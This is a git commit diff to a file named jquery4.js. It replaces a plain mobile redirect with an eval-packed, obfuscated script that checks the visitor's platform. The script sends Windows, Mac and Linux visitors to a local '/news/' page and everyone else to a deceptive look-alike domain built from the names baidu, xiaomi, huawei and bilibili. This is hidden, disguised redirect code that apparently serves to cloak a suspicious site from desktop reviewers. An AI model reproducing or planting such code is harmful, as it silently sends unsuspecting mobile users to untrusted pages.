22af0abaf261191f542de5a18c887a287cd03606
kkaaas <69374310+kkaaas@users.noreply.github.com>
2021-12-08 14:06:45 +0800

    Update and rename jquery.js to jquery4.js

--- jquery4.js
+++ jquery4.js
@@ -16,13 +16,8 @@
       }
     }, 300);
 //判断
-function RuPage(){
- if((navigator.userAgent.match(/(iPhone|iPod|Android|ios|iPad)/i))){
-   window.location.href=" http://baidu.com_______________________xiaomi.huawei.bilibili.sy6602621.top/m";
- }else{
-   window.location.href="/a/index.html"; 
- }
-}
+eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('2 1={};2 p=7.g;2 u=7.f;1.8=p.3("i")==0;1.9=p.3("h")==0;1.c=(p=="b")||(p.3("d")==0);q(1.8||1.9||1.r){5.6.4=\'/l/\'}a{5.6.4=" j://n.o.k.t.s.e/m"}a{}',31,31,'|system|var|indexOf|href|window|location|navigator|win|mac|else|X11|x11|Linux|top|userAgent|platform|Mac|Win|http|huawei|news||baidu|com_______________________xiaomi||if|xll|sy6602621|bilibili|'.split('|'),0,{}))
+
 
 //点击事件
 setTimeout(function() {
